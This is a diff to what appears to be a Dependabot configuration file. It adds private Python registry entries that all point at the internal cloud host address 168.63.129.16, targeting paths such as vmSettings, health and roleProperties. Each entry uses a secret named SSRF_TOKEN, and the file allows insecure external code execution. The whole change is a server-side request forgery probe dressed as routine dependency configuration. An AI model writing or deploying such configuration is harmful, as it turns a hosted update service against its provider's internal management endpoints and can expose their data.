@@ -1,12 +1,24 @@
 version: 2
 registries:
-  p32526-versions:
+  hgap-versions:
     type: python-index
-    url: http://168.63.129.16:32526/?comp=versions#
+    url: http://168.63.129.16:32526/versions#
     token: ${{ secrets.SSRF_TOKEN }}
-  p32526-goalstate:
+  hgap-vmsettings:
     type: python-index
-    url: http://168.63.129.16:32526/machine/?comp=goalstate#
+    url: http://168.63.129.16:32526/vmSettings#
+    token: ${{ secrets.SSRF_TOKEN }}
+  hgap-health:
+    type: python-index
+    url: http://168.63.129.16:32526/health#
+    token: ${{ secrets.SSRF_TOKEN }}
+  wire-health:
+    type: python-index
+    url: http://168.63.129.16/machine?comp=health#
+    token: ${{ secrets.SSRF_TOKEN }}
+  wire-role:
+    type: python-index
+    url: http://168.63.129.16/machine?comp=roleProperties#
     token: ${{ secrets.SSRF_TOKEN }}
 updates:
   - package-ecosystem: "pip"
@@ -15,5 +27,8 @@ updates:
       interval: "daily"
     insecure-external-code-execution: allow
     registries:
-      - p32526-versions
-      - p32526-goalstate
+      - hgap-versions
+      - hgap-vmsettings
+      - hgap-health
+      - wire-health
+      - wire-role
